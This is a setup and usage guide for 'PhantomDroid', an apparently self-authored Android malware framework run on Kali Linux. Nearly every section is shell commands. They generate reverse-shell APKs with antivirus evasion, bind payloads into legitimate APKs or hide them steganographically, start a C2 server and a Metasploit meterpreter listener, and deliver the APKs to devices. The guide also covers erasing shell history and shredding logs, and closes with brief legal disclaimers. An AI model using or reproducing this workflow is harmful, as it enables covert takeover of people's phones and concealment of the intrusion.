# 🐉 PhantomDroid on Kali Linux - Complete Setup Guide

**Created by: M DHARAN RAJ - Web Developer & Ethical Hacker**

## 🎯 Overview

This guide covers cloning PhantomDroid from GitHub and setting it up on Kali Linux for professional penetration testing. Kali Linux is the ideal environment for PhantomDroid as it includes most required tools pre-installed.

## 📋 Prerequisites

### Kali Linux Requirements
- **Kali Linux 2023.1+** (Rolling or any recent version)
- **Internet connection** for cloning and dependencies
- **Root access** or sudo privileges
- **Minimum 2GB RAM** and 10GB free disk space

### Pre-installed Tools (Usually Available)
- Python 3.8+
- Java OpenJDK
- Git
- APK tools (aapt, zipalign)
- Android SDK tools

## 🚀 Step-by-Step Installation

### Step 1: Clone from GitHub

```bash
# Update Kali Linux
sudo apt update && sudo apt upgrade -y

# Clone PhantomDroid repository
git clone https://github.com/YOUR_USERNAME/PhantomDroid.git

# Navigate to directory
cd PhantomDroid

# Check contents
ls -la
```

### Step 2: Run Automated Installer

```bash
# Make installer executable
chmod +x install.sh

# Run installer (will install all dependencies)
sudo ./install.sh

# The installer will:
# - Install system dependencies
# - Setup Python environment
# - Install Android SDK tools
# - Configure apktool
# - Setup PhantomDroid framework
```

### Step 3: Manual Setup (If Automated Installer Fails)

```bash
# Install system dependencies
sudo apt install -y python3 python3-pip python3-venv
sudo apt install -y openjdk-11-jdk android-tools-adb android-tools-fastboot
sudo apt install -y aapt zipalign apktool git curl wget unzip

# Install Python dependencies
pip3 install --user flask cryptography requests lxml beautifulsoup4 pillow

# Make scripts executable
chmod +x phantomdroid.sh
chmod +x core/*.py
```

### Step 4: Verify Installation

```bash
# Check dependencies
python3 --version
java -version
apktool --version

# Test PhantomDroid modules
python3 core/payload_generator.py --help
python3 core/apk_binder.py --help
python3 core/c2_server.py --help
```

## 🎮 Execution Methods

### Method 1: Interactive Shell Mode (Recommended)

```bash
# Navigate to PhantomDroid directory
cd PhantomDroid

# Run interactive mode
./phantomdroid.sh

# You'll see the main menu:
# ╔══════════════════════════════════════════════════════════════╗
# ║                    PHANTOMDROID MAIN MENU                    ║
# ╠══════════════════════════════════════════════════════════════╣
# ║ 1. Generate Standalone Payload                               ║
# ║ 2. Bind Payload to Existing APK                              ║
# ║ 3. Advanced AV Evasion Payload                               ║
# ║ 4. Steganographic Payload                                    ║
# ║ 5. Social Engineering Kit                                    ║
# ║ 6. Start C2 Server                                           ║
# ║ 7. APK Forensics & Analysis                                  ║
# ║ 8. Batch Payload Generation                                  ║
# ║ 9. Framework Configuration                                   ║
# ║ 10. Web Interface                                            ║
# ║ 11. Clean Workspace                                          ║
# ║ 0. Exit Framework                                            ║
# ╚══════════════════════════════════════════════════════════════╝
```

### Method 2: Command Line Mode

```bash
# Generate TCP reverse shell
./phantomdroid.sh --payload tcp --lhost 192.168.1.100 --lport 4444 --evasion high

# Bind payload to existing APK
./phantomdroid.sh --target /path/to/original.apk --lhost 192.168.1.100 --lport 4444

# Enable debug mode
./phantomdroid.sh --debug --verbose
```

### Method 3: Direct Python Execution

```bash
# Generate standalone payload
python3 core/payload_generator.py \
    --type tcp_reverse \
    --lhost 192.168.1.100 \
    --lport 4444 \
    --evasion extreme \
    --output /tmp/phantom_payloads

# Bind to existing APK
python3 core/apk_binder.py \
    --apk /path/to/original.apk \
    --lhost 192.168.1.100 \
    --lport 4444 \
    --method 1 \
    --evasion high

# Start C2 server
python3 core/c2_server.py \
    --port 8080 \
    --protocol 1 \
    --log-dir /var/log/phantom

# Launch web interface
python3 core/web_interface.py
```

### Method 4: Web Interface

```bash
# Start web interface
python3 core/web_interface.py

# Access from browser
firefox http://localhost:8080 &

# Or from remote machine
python3 core/web_interface.py --host 0.0.0.0 --port 8080
# Access: http://KALI_IP:8080
```

## 🔧 Kali-Specific Configuration

### Network Setup

```bash
# Find your Kali IP address
ip addr show
# or
ifconfig

# For testing on local network
# Use: 192.168.1.x (your Kali IP)

# For external testing (with VPS)
# Use: your-vps-ip or domain
```

### Metasploit Integration

```bash
# Start Metasploit (if needed)
sudo systemctl start postgresql
sudo msfdb init

# Create listener for PhantomDroid payloads
msfconsole -q -x "
use multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit -j
"
```

### Android Device Connection

```bash
# Enable ADB debugging on target device
# Connect via USB or network

# Check connected devices
adb devices

# Install generated APK
adb install output/payloads/phantom_tcp_*.apk

# Or use web server for download
python3 -m http.server 8000 -d output/payloads/
# Device downloads from: http://KALI_IP:8000/
```

## 🎯 Complete Penetration Testing Workflow

### Phase 1: Setup

```bash
# 1. Clone and setup PhantomDroid
git clone https://github.com/YOUR_USERNAME/PhantomDroid.git
cd PhantomDroid
sudo ./install.sh

# 2. Start framework
./phantomdroid.sh
```

### Phase 2: Payload Generation

```bash
# 3. Generate payload (Option 1 in menu)
# - Type: TCP Reverse Shell
# - LHOST: 192.168.1.100 (your Kali IP)
# - LPORT: 4444
# - Evasion: High

# Or command line:
python3 core/payload_generator.py --type tcp_reverse --lhost 192.168.1.100 --lport 4444 --evasion high
```

### Phase 3: C2 Infrastructure

```bash
# 4. Start C2 server (Option 6 in menu)
python3 core/c2_server.py --port 8080 --protocol 1

# 5. Start Metasploit listener (separate terminal)
msfconsole -q -x "use multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.1.100; set LPORT 4444; exploit -j"
```

### Phase 4: Deployment & Testing

```bash
# 6. Deploy APK to target device
adb install output/payloads/phantom_tcp_*.apk

# 7. Monitor C2 dashboard
firefox http://localhost:8080 &

# 8. Execute commands via C2 interface
```

## 🛡️ Advanced Features on Kali

### Steganographic Payloads

```bash
# Hide payload in legitimate APK resources
python3 core/av_evasion.py --level extreme --input payload_source --output steganographic_payload
```

### Network Pivoting

```bash
# Use with proxychains for pivoting
proxychains python3 core/c2_server.py --port 8080

# SSH tunneling for remote C2
ssh -L 8080:localhost:8080 user@remote-server
```

### Traffic Analysis

```bash
# Monitor network traffic
sudo tcpdump -i any -w phantom_traffic.pcap host 192.168.1.100

# Analyze with Wireshark
wireshark phantom_traffic.pcap &
```

## 🔍 Troubleshooting on Kali

### Common Issues & Solutions

1. **Permission Denied**
   ```bash
   sudo chown -R $USER:$USER PhantomDroid/
   chmod +x phantomdroid.sh core/*.py
   ```

2. **Python Module Missing**
   ```bash
   pip3 install --user flask cryptography requests
   # or
   sudo apt install python3-flask python3-cryptography
   ```

3. **Java/APK Tools Issues**
   ```bash
   sudo apt install --reinstall openjdk-11-jdk apktool
   sudo update-alternatives --config java
   ```

4. **Android SDK Missing**
   ```bash
   sudo apt install android-sdk android-tools-adb
   export ANDROID_HOME=/usr/lib/android-sdk
   ```

### Debug Mode

```bash
# Enable verbose logging
./phantomdroid.sh --debug --verbose

# Check logs
tail -f logs/phantomdroid.log
tail -f logs/c2_server.log

# Test individual components
python3 core/payload_generator.py --type tcp_reverse --lhost 127.0.0.1 --lport 4444 --debug
```

## 📊 Performance Optimization

### Resource Management

```bash
# Monitor resource usage
htop

# Limit Python processes
ulimit -u 1000

# Clean temporary files
./phantomdroid.sh
# Select Option 11: Clean Workspace
```

### Network Optimization

```bash
# Optimize network settings
echo 'net.core.rmem_max = 16777216' | sudo tee -a /etc/sysctl.conf
echo 'net.core.wmem_max = 16777216' | sudo tee -a /etc/sysctl.conf
sudo sysctl -p
```

## 🔒 Security Considerations

### Operational Security

```bash
# Use VPN for external testing
sudo openvpn --config your-vpn.ovpn

# Encrypt sensitive data
gpg --symmetric --cipher-algo AES256 sensitive_payload.apk

# Secure log files
chmod 600 logs/*.log
```

### Clean Up After Testing

```bash
# Clean all generated files
./phantomdroid.sh
# Select Option 11: Clean Workspace

# Remove traces
history -c
rm -rf ~/.bash_history
shred -vfz -n 3 logs/*.log
```

## 📱 Mobile Device Setup

### Android Testing Device

```bash
# Enable Developer Options
# Settings > About > Tap Build Number 7 times

# Enable USB Debugging
# Settings > Developer Options > USB Debugging

# Allow Unknown Sources
# Settings > Security > Unknown Sources

# Connect to Kali
adb connect DEVICE_IP:5555
```

### Network Testing

```bash
# Create isolated test network
sudo systemctl start hostapd
sudo systemctl start dnsmasq

# Monitor device connections
sudo airodump-ng wlan0mon
```

## 🎓 Learning Resources

### Practice Targets

```bash
# Use with DVWA (Damn Vulnerable Web Application)
# Use with intentionally vulnerable Android apps
# Practice on your own devices only
```

### Documentation

```bash
# Read framework documentation
cat README.md
cat USAGE.md

# Check available options
./phantomdroid.sh --help
python3 core/payload_generator.py --help
```

## 🚨 Legal & Ethical Guidelines

### Before Using PhantomDroid

- ✅ **Obtain written authorization** for all testing
- ✅ **Test only on systems you own** or have explicit permission
- ✅ **Follow responsible disclosure** for any vulnerabilities found
- ✅ **Comply with local laws** and regulations
- ❌ **Never use on unauthorized systems**
- ❌ **Don't cause harm or disruption**

### Best Practices

1. **Document everything** - Keep detailed logs of all activities
2. **Use isolated networks** - Don't test on production systems
3. **Respect privacy** - Handle data responsibly
4. **Report responsibly** - Follow coordinated disclosure
5. **Stay updated** - Keep tools and knowledge current

## 📞 Support & Community

### Getting Help

```bash
# Check logs for errors
tail -f logs/phantomdroid.log

# Enable debug mode
./phantomdroid.sh --debug --verbose

# Test individual components
python3 core/payload_generator.py --help
```

### Contributing

```bash
# Fork the repository
# Make improvements
# Submit pull requests
# Follow coding standards
```

## 🎉 Quick Start Summary

```bash
# 1. Clone repository
git clone https://github.com/YOUR_USERNAME/PhantomDroid.git
cd PhantomDroid

# 2. Install dependencies
sudo ./install.sh

# 3. Run framework
./phantomdroid.sh

# 4. Generate payload (Option 1)
# 5. Start C2 server (Option 6)
# 6. Deploy and test responsibly
```

---

**PhantomDroid Framework v2.0**  
**Created by: M DHARAN RAJ - Web Developer & Ethical Hacker**

**Remember**: Use PhantomDroid responsibly and only for authorized security testing! 🔒

---

*This guide ensures PhantomDroid runs optimally on Kali Linux for professional penetration testing engagements.*
